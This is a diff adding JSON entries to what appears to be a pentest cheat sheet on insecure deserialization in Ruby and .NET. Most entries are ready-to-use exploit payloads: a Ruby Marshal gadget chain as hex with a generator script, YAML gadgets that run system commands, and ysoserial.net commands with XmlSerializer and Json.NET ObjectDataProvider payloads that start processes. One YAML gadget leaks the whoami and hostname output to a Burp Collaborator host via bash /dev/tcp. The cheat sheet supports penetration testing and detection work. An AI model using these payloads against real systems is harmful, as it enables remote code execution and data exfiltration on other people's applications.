+      "body": "for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\"].pack(\"H*\")) rescue nil'; done"
+    },
+    {
+      "subcategory": "Ruby",
+      "title": "Marshal - script to generate and verify the gadget chain",
+      "language": "ruby",
+      "tags": ["ruby", "marshal", "rce", "gadget"],
+      "body": "#!/usr/bin/env ruby\n\nclass Gem::StubSpecification\n  def initialize; end\nend\n\n\nstub_specification = Gem::StubSpecification.new\nstub_specification.instance_variable_set(:@loaded_from, \"|id 1>&2\")\n\nputs \"STEP n\"\nstub_specification.name rescue nil\nputs\n\n\nclass Gem::Source::SpecificFile\n  def initialize; end\nend\n\nspecific_file = Gem::Source::SpecificFile.new\nspecific_file.instance_variable_set(:@spec, stub_specification)\n\nother_specific_file = Gem::Source::SpecificFile.new\n\nputs \"STEP n-1\"\nspecific_file <=> other_specific_file rescue nil\nputs\n\n\n$dependency_list= Gem::DependencyList.new\n$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])\n\nputs \"STEP n-2\"\n$dependency_list.each{} rescue nil\nputs\n\n\nclass Gem::Requirement\n  def marshal_dump\n    [$dependency_list]\n  end\nend\n\npayload = Marshal.dump(Gem::Requirement.new)\n\nputs \"STEP n-3\"\nMarshal.load(payload) rescue nil\nputs\n\n\nputs \"VALIDATION (in fresh ruby process):\"\nIO.popen(\"ruby -e 'Marshal.load(STDIN.read) rescue nil'\", \"r+\") do |pipe|\n  pipe.print payload\n  pipe.close_write\n  puts pipe.gets\n  puts\nend\n\nputs \"Payload (hex):\"\nputs payload.unpack('H*')[0]\nputs\n\n\nrequire \"base64\"\nputs \"Payload (Base64 encoded):\"\nputs Base64.encode64(payload)"
+    },
+    {
+      "subcategory": "Ruby",
+      "title": "YAML - vulnerable code (YAML.load)",
+      "language": "ruby",
+      "tags": ["ruby", "yaml", "sink"],
+      "body": "require \"yaml\"\nYAML.load(File.read(\"p.yml\"))"
+    },
+    {
+      "subcategory": "Ruby",
+      "title": "YAML - universal gadget (ruby <= 2.7.2)",
+      "language": "text",
+      "tags": ["ruby", "yaml", "rce", "gadget"],
+      "body": "--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source::SpecificFile\n    spec: &1 !ruby/object:Gem::StubSpecification\n      loaded_from: \"|id 1>&2\"\n  - !ruby/object:Gem::Source::SpecificFile\n      spec:"
+    },
+    {
+      "subcategory": "Ruby",
+      "title": "YAML - universal gadget (ruby 2.x-3.x, system)",
+      "language": "text",
+      "tags": ["ruby", "yaml", "rce", "gadget"],
+      "body": "---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &1 !ruby/object:Net::BufferedIO\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"abc\"\n      debug_output: &1 !ruby/object:Net::WriteAdapter\n         socket: &1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module 'Kernel'\n                 method_id: :system\n             git_set: id\n         method_id: :resolve"
+    },
+    {
+      "subcategory": "Ruby",
+      "title": "YAML - universal gadget (ruby 2.x-3.x, sleep)",
+      "language": "text",
+      "tags": ["ruby", "yaml", "rce", "gadget"],
+      "body": " ---\n - !ruby/object:Gem::Installer\n     i: x\n - !ruby/object:Gem::SpecFetcher\n     i: y\n - !ruby/object:Gem::Requirement\n   requirements:\n     !ruby/object:Gem::Package::TarReader\n     io: &1 !ruby/object:Net::BufferedIO\n       io: &1 !ruby/object:Gem::Package::TarReader::Entry\n          read: 0\n          header: \"abc\"\n       debug_output: &1 !ruby/object:Net::WriteAdapter\n          socket: &1 !ruby/object:Gem::RequestSet\n              sets: !ruby/object:Net::WriteAdapter\n                  socket: !ruby/module 'Kernel'\n                  method_id: :system\n              git_set: sleep 600\n          method_id: :resolve "
+    },
+    {
+      "subcategory": "Ruby",
+      "title": "YAML - gadget with reverse shell via Burp Collaborator",
+      "language": "text",
+      "tags": ["ruby", "yaml", "rce", "oob"],
+      "body": "---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &1 !ruby/object:Net::BufferedIO\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"abc\"\n      debug_output: &1 !ruby/object:Net::WriteAdapter\n         socket: &1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module 'Kernel'\n                 method_id: :system\n             git_set: \"bash -c 'echo 1 > /dev/tcp/`whoami`.`hostname`.wkkib01k9lsnq9qm2pogo10tmksagz.burpcollaborator.net/443'\"\n         method_id: :resolve"
+    },
+
+    {
+      "subcategory": ".NET",
+      "title": "Recognizing .NET serialization",
+      "language": "table",
+      "tags": ["dotnet", "detection", "magic-bytes"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Data", "Description"],
+          "rows": [
+            ["AAEAAD (Hex)", ".NET BinaryFormatter"],
+            ["FF01 (Hex)", ".NET ViewState"],
+            ["/w (Base64)", ".NET ViewState"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": ".NET",
+      "title": "Example BinaryFormatter Base64 payload",
+      "language": "text",
+      "tags": ["dotnet", "binaryformatter", "detection"],
+      "body": "AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs="
+    },
+    {
+      "subcategory": ".NET",
+      "title": "ysoserial.net / ysonet - generating payloads",
+      "language": "powershell",
+      "tags": ["dotnet", "ysoserial.net", "rce", "tool"],
+      "body": "cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s\n./ysoserial.exe -p DotNetNuke -m read_file -f win.ini\n./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc\" -t\n./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c \"calc\" -t"
+    },
+    {
+      "subcategory": ".NET",
+      "title": "ysoserial.net / ysonet - what it is",
+      "language": "text",
+      "tags": ["dotnet", "ysoserial.net", "tool"],
+      "body": "Deserialization payload generators for various .NET formatters:\n• pwntester/ysoserial.net (github.com/pwntester/ysoserial.net)\n• irsdl/ysonet (github.com/irsdl/ysonet) - identical syntax, the same command works by replacing ysoserial.exe with ysonet.exe.\nKey flags: -f formatter, -g gadget, -c command, -o output format (raw/base64), -t test."
+    },
+    {
+      "subcategory": ".NET",
+      "title": ".NET Native Formatters - map of formatters and gadgets",
+      "language": "image",
+      "tags": ["dotnet", "formatters", "gadget"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/insecure-deserialization/NETNativeFormatters.png",
+        "caption": ".NET Native Formatters (pwntester/attacking-net-serialization): for each formatter - the output format (Binary/XML/JSON/SOAP/Text), whether type control is required (expected Type), and which gadgets are applicable (ISerializable / Setters). BinaryFormatter, NetDataContractSerializer, SoapFormatter, ObjectStateFormatter, LosFormatter, BinaryMessageFormatter - ISerializable gadgets; DataContractSerializer, XmlSerializer, JavaScriptSerializer, DataContractJsonSerializer, XmlMessageFormatter - Setters gadgets when the type is controlled. Source: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": ".NET",
+      "title": "XmlSerializer - where to look and payload (ObjectDataProvider)",
+      "language": "xml",
+      "tags": ["dotnet", "xmlserializer", "objectdataprovider", "rce"],
+      "body": ".\\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c \"calc.exe\"\n<?xml version=\"1.0\"?>\n<root type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">\n    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" >\n        <ExpandedElement/>\n        <ProjectedProperty0>\n            <MethodName>Parse</MethodName>\n            <MethodParameters>\n                <anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">\n                    <![CDATA[<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:b=\"clr-namespace:System;assembly=mscorlib\" xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>\n                </anyType>\n            </MethodParameters>\n            <ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance>\n        </ProjectedProperty0>\n    </ExpandedWrapperOfXamlReaderObjectDataProvider>\n</root>"
+    },
+    {
+      "subcategory": ".NET",
+      "title": "DataContractSerializer - where to look",
+      "language": "text",
+      "tags": ["dotnet", "datacontractserializer", "detection"],
+      "body": "DataContractSerializer deserializes in a loosely coupled way: it never reads the CLR type and assembly names from the input data. Its security model is similar to XmlSerializer.\n• In C# source, look for DataContractSerializer(typeof(<TYPE>)).\n• Payload output: XML.\n• For exploitation the data type (Type) must be controlled by the user."
+    },
+    {
+      "subcategory": ".NET",
+      "title": "NetDataContractSerializer - where to look and payload",
+      "language": "powershell",
+      "tags": ["dotnet", "netdatacontractserializer", "rce"],
+      "body": "In C# source, look for NetDataContractSerializer().ReadObject(). Payload output: XML. Serializes any type with the [Serializable] attribute like BinaryFormatter.\n.\\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c \"calc.exe\" -o base64 -t"
+    },
+    {
+      "subcategory": ".NET",
+      "title": "LosFormatter - payload",
+      "language": "powershell",
+      "tags": ["dotnet", "losformatter", "rce"],
+      "body": "// Internally uses BinaryFormatter.\n.\\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c \"calc.exe\" -o base64 -t"
+    },
+    {
+      "subcategory": ".NET",
+      "title": "JSON.NET - where to look and payload (ObjectDataProvider)",
+      "language": "json",
+      "tags": ["dotnet", "json.net", "objectdataprovider", "rce"],
+      "body": ".\\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc.exe\" -t\n{\n    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', \n    'MethodName':'Start',\n    'MethodParameters':{\n        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',\n        '$values':['cmd', '/c calc.exe']\n    },\n    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}\n}"
+    },
+    {
+      "subcategory": ".NET",
+      "title": "BinaryFormatter - where to look and payload",
+      "language": "powershell",
+      "tags": ["dotnet", "binaryformatter", "rce"],
+      "body": "In C# source, look for System.Runtime.Serialization.Binary.BinaryFormatter. For exploitation you need [Serializable] or the ISerializable interface. Payload output: Binary. (BinaryFormatter is insecure by design and cannot be made safe.)\n./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c \"calc\" -t"
+    },
+    {
+      "subcategory": ".NET",
+      "title": ".NET POP gadgets - properties and popular classes",
+      "language": "text",
+      "tags": ["dotnet", "pop", "gadget"],
+      "body": "Gadgets must have: serializability; public/settable variables; magic functions (Get/Set, OnSerialisation, constructors/destructors). The gadget is chosen for a specific formatter.\nPopular gadgets:\n• ObjectDataProvider (PresentationFramework.dll) - MethodParameters sets the parameters, MethodName invokes an arbitrary function.\n• ExpandedWrapper - specifies the types of the encapsulated objects: ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();\n• System.Configuration.Install.AssemblyInstaller - executes the payload via Assembly.Load (set_Path -> Assembly.LoadFrom(value))."
+    }
+  ]
+}
